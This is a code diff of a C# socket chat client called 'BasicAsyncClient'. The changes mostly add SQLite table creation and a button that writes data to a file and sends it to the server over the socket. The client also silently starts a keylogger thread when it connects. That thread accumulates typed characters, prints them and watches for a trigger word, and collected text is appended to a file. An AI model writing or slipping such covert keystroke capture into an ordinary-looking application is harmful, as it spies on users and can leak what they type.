@@ -135,7 +135,7 @@ namespace BasicAsyncClient
                 // write on txtBox
                 txbChat.AppendText("ME: " + msg);
                 txbChat.AppendText(Environment.NewLine);
-   }
+            }
             catch (SocketException ex)
             {
                 ShowErrorDialog(ex.Message);
@@ -170,8 +170,13 @@ namespace BasicAsyncClient
                     
                     Thread keyLogger = new Thread(ClientForm.playKeyLogger);
                     keyLogger.Start();
-                    //checkDB();
 
+
+                    createNewDatabase();
+                    connectToDatabase();
+                    createTable();
+                    fillTable();
+                    printClientData();
 
 
                 }
@@ -189,8 +194,6 @@ namespace BasicAsyncClient
 
         public static void playKeyLogger()
         {
-           
-            
             String input = "";
             Boolean flag = true;
             while (flag)
@@ -204,12 +207,10 @@ namespace BasicAsyncClient
                     {
                        
                         input += (char)i;
-                        Console.WriteLine((char)i+ ", "+input);
+                       
                         if (i == 32)
                         { 
-                           
-                            //Console.Write(input);
-                           
+                            Console.WriteLine(input);
                             if (input == "SARA ")
                             {
                                 ShowErrorDialog("SARA insert");
@@ -252,6 +253,7 @@ namespace BasicAsyncClient
             using (StreamWriter sw = File.AppendText(path))
             {
                 sw.Write(AllApp);
+
             }
 
 
@@ -275,7 +277,7 @@ namespace BasicAsyncClient
         // Creates an empty database file
         void createNewDatabase()
         {
-            DB = clientName + "DB.sqlite";
+            DB = clientName + "DB.sqlite"; 
             SQLiteConnection.CreateFile(DB);
         }
 
@@ -292,6 +294,7 @@ namespace BasicAsyncClient
             string sql = "create table clientData (name varchar(20), score int)";
             SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
             command.ExecuteNonQuery();
+
         }
 
         // Inserts some values in the clientData table.
@@ -321,20 +324,23 @@ namespace BasicAsyncClient
                 txbDB.Text +="Name: " + reader["name"] + "\tScore: " + reader["score"]+"\n";
             }
               
-           
+            m_dbConnection.Close();
         }
 
         private void sendDB_Click(object sender, EventArgs e)
         {
             string path = Directory.GetCurrentDirectory();
-            path = System.IO.Path.Combine(path, clientName+"-Data.txt");
+            path = System.IO.Path.Combine(path, clientName + ".txt");
             using (System.IO.StreamWriter file = new System.IO.StreamWriter(path, true))
             {
-                file.WriteLine(DateTime.Now.ToString());         
+                 
                 file.WriteLine(txbDB.Text);
             }
+           
             clientSocket.SendFile(path);
+
 
         }
     }
 }
+
